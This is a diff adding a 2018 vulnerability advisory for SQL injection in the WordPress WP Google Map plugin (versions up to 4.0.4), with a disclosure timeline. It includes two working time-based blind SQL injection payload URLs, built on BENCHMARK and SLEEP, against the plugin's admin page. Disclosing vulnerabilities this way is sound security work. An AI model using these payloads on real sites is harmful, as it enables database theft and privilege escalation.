@@ -1,0 +1,40 @@
+# Title: WordPress Google Map Plugin < 4.0.4 - SQL Injection
+# Author: defensecode
+# Date: 2018-06-12
+# Software: WordPress WP Google Map plugin
+# Version: 4.0.4 and below
+# Vendor Status:  Vendor contacted, no response
+
+# Vulnerability Description
+# The easiest way to reproduce the vulnerabilities is to visit the
+# provided URL while being logged in as administrator or another user
+# that is authorized to access the plugin settings page. Users that do
+# not have full administrative privileges could abuse the database
+# access the vulnerabilities provide to either escalate their privileges
+# or obtain and modify database contents they were not supposed to be
+# able to.
+
+# Due to the missing nonce token, the vulnerable code is also directly
+# exposed to attack vectors such as Cross Site request forgery (CSRF).
+
+# SQL injection
+# Vulnerable Function:  $wpdb->get_results()
+# Vulnerable Variable:  $_GET['order']
+# Vulnerable URL:
+
+http://vulnerablesite.com/wp-admin/admin.php?page=wpgmp_manage_location&orderby=location_address&order=asc
+PROCEDURE ANALYSE(EXTRACTVALUE(4242,CONCAT(0x42,(BENCHMARK(42000000,MD5(0x42424242))))),42)
+
+
+# SQL injection
+# Vulnerable Function:  $wpdb->get_results()
+# Vulnerable Variable:  $_GET['orderby']
+# Vulnerable URL:
+
+http://vulnerablesite.com/wp-admin/admin.php?page=wpgmp_manage_location&order=asc&orderby=location_address%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(555)))xxx)&order=asc
+
+# Disclosure Timeline
+# 2018/05/11   Vulnerabilities discovered
+# 2018/05/16   Vendor contacted
+# 2018/06/08   No response
+# 2018/06/12   Advisory released to the public
